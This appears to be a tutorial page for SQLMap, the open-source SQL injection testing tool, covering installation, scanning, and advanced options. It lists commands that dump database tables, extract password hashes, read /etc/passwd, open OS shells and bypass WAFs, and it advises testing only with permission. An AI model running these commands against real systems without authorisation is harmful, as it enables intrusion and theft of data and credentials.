About SQLMap

SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws. It comes with a powerful detection engine and many features for the ultimate penetration tester.

Key Features

  • Full support for various SQL injection techniques
  • Database fingerprinting
  • Data extraction from the database
  • Access to underlying file system
  • Command execution on the operating system
  • Support for multiple database management systems

Supported Databases

  • MySQL
  • Oracle
  • PostgreSQL
  • Microsoft SQL Server
  • SQLite
  • IBM DB2
  • And many others...

Installation

Using Git

git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

Using Python pip

pip install sqlmap

On Kali Linux

sudo apt update && sudo apt install sqlmap

Basic Usage Guide

1. Basic URL Scan

Test a URL for SQL injection:

sqlmap -u "http://example.com/page.php?id=1"

2. POST Request Testing

Test POST parameters:

sqlmap -u "http://example.com/login.php" --data="username=admin&password=admin"

3. Using Request File

Test using a captured request:

sqlmap -r request.txt

Advanced Usage

1. Database Enumeration

List available databases:

sqlmap -u "URL" --dbs

List tables in a database:

sqlmap -u "URL" -D database_name --tables

Dump table contents:

sqlmap -u "URL" -D database_name -T table_name --dump

2. Advanced Options

  • Use DBMS authentication: sqlmap -u "URL" --dbms=mysql --user=root --password=root
  • Specify injection technique: sqlmap -u "URL" --technique=BEUSTQ
  • Use a specific parameter: sqlmap -u "URL" -p username

3. OS Command Execution

Execute OS commands:

sqlmap -u "URL" --os-shell

Get OS command prompt:

sqlmap -u "URL" --os-cmd=whoami

Practical Examples

Testing Authentication Bypass

sqlmap -u "http://example.com/login.php" --data="user=admin&password=admin" --level=5 --risk=3

Extracting Password Hashes

sqlmap -u "URL" --passwords --batch

File System Access

sqlmap -u "URL" --file-read="/etc/passwd"

Best Practices

  • Legal Compliance: Only test systems you have permission to test
  • Performance: Start with basic options and gradually increase complexity
  • Accuracy: Use --batch for automated runs, but verify results manually
  • Documentation: Keep logs of all testing sessions
  • Risk Management: Be cautious with high-risk options that might damage the target

Common Issues and Solutions

  • False Positives: Use --level and --risk parameters to adjust testing depth
  • WAF Detection: Use --tamper scripts to bypass security measures
  • Connection Issues: Adjust --timeout and --delay parameters
  • Performance: Use --threads for faster scanning

Important SQLMap Flags

  • --random-agent: Use random User-Agent
  • --batch: Never ask for user input
  • --risk=3: Higher risk of detection
  • --level=5: Higher level of tests
  • --proxy: Use a proxy for requests
  • --tamper: Use tamper scripts
